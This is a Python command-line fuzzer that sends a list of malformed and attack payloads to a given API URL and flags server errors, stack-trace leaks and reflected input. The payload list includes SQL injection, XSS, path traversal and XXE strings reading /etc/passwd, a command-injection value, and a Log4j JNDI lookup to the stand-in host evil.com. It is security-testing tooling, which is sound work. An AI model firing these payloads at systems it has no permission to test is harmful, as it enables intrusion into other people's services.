#!/usr/bin/env python3
"""
Custom Web/API Fuzzer
Automates sending invalid data to web APIs to find unexpected errors and vulnerabilities.
"""

import argparse
import requests
import json
import string
import random
import time
from urllib.parse import urlparse

class APIFuzzer:
    def __init__(self, url, method='GET'):
        self.url = url
        self.method = method.upper()
        self.session = requests.Session()
        self.session.timeout = 10

    def generate_fuzz_payloads(self):
        """Generate fuzzing payloads"""
        payloads = [
            '',  # Empty
            'A' * 1000,  # Long string
            'A' * 10000,  # Very long
            "' OR '1'='1",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../../../etc/passwd",  # Path traversal
            '\x00\x01\x02\x03',  # Binary
            '{"malformed": json}',  # Malformed JSON
            '|| echo vulnerable ||',  # Command injection
            'sleep(10)',  # Time-based
            'exists(/)',  # XPath injection
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',  # XXE
            'undefined',  # JavaScript injection
            '../../../windows/system32/drivers/etc/hosts',  # Windows path
            '%00%n%s%p%x%d',  # Format string
            'SELECT * FROM users',  # Direct SQL
            '${jndi:ldap://evil.com}',  # Log4j
            '..\0..\0..\0..\0windows\0system.ini',  # Null byte injection
            '💣🔥',  # Unicode
            '0xCAFEBABE',  # Hex
            'NaN',  # Special floats
            '-Infinity',
            '91763e3f5d4c4b4b9d9ddf7e',  # Random UUID-like
        ]

        # Add random strings
        for _ in range(10):
            length = random.randint(1, 500)
            payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))
            payloads.append(payload)

        return payloads

    def send_request(self, payload):
        """Send request with payload"""
        try:
            headers = {'Content-Type': 'application/json', 'User-Agent': 'CustomAPI Fuzzer/1.0'}

            if self.method == 'GET':
                params = {'input': payload}
                resp = self.session.get(self.url, params=params, headers=headers)
            elif self.method in ['POST', 'PUT', 'PATCH']:
                data = {'input': payload}
                if self.method == 'POST':
                    resp = self.session.post(self.url, json=data, headers=headers)
                elif self.method == 'PUT':
                    resp = self.session.put(self.url, json=data, headers=headers)
                elif self.method == 'PATCH':
                    resp = self.session.patch(self.url, json=data, headers=headers)
            else:
                print(f"Unsupported method: {self.method}")
                return None

            return resp

        except requests.exceptions.RequestException as e:
            return f"Request Error: {e}"
        except Exception as e:
            return f"Error: {e}"

    def analyze_response(self, response, payload):
        """Analyze if response indicates vulnerability/error"""
        if isinstance(response, requests.Response):
            status = response.status_code
            content = response.text.lower()

            # Check for errors
            errors = []

            if status >= 500:
                errors.append(f"Server Error: {status}")
            elif status == 400:
                errors.append("Bad Request")
            elif status not in [200, 201, 302, 401, 403, 404]:
                errors.append(f"Unusual Status: {status}")

            # Check response content for signs
            if any(word in content for word in ['error', 'exception', 'stack trace', 'fatal', 'traceback', 'sql', 'syntax']):
                if 'sql' in content:
                    errors.append("Possible SQL Error")
                if 'stack' in content:
                    errors.append("Stack Trace Leak")

            # Check if payload appears in response (reflection)
            if payload and len(payload) > 3 and payload.lower() in content:
                errors.append("Input Reflection Detected")

            return {
                'status': status,
                'errors': errors,
                'content_length': len(response.text) if hasattr(response, 'text') else 0
            }

        else:
            return {'status': 'ERROR', 'errors': [str(response)], 'content_length': 0}

    def fuzz(self, delay=0.1):
        """Run fuzzing"""
        print(f"Starting fuzzing campaign against {self.url} with method {self.method}")
        print("-" * 60)

        payloads = self.generate_fuzz_payloads()

        for i, payload in enumerate(payloads):
            print(f"[{i+1}/{len(payloads)}] Testing payload: {repr(payload[:50])}")

            response = self.send_request(payload)
            analysis = self.analyze_response(response, payload)

            if analysis['errors']:
                print(f"  🚨 POTENTIAL VULNERABILITY: {', '.join(analysis['errors'])}")
                print(f"  Status: {analysis['status']}, Content Length: {analysis['content_length']}")
            else:
                print(f"  ✅ Normal response (Status: {analysis['status']})")

            time.sleep(delay)  # Rate limiting

        print("-" * 60)
        print("Fuzzing complete.")

def main():
    parser = argparse.ArgumentParser(description='Custom API Fuzzer')
    parser.add_argument('--url', required=True, help='Target API URL')
    parser.add_argument('--method', default='GET', choices=['GET', 'POST', 'PUT', 'PATCH'], help='HTTP method')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests in seconds')

    args = parser.parse_args()

    # Validate URL
    parsed = urlparse(args.url)
    if not parsed.scheme or not parsed.netloc:
        parser.error("Invalid URL. Must include http:// or https://")

    fuzzer = APIFuzzer(args.url, args.method)
    fuzzer.fuzz(delay=args.delay)

if __name__ == '__main__':
    main()
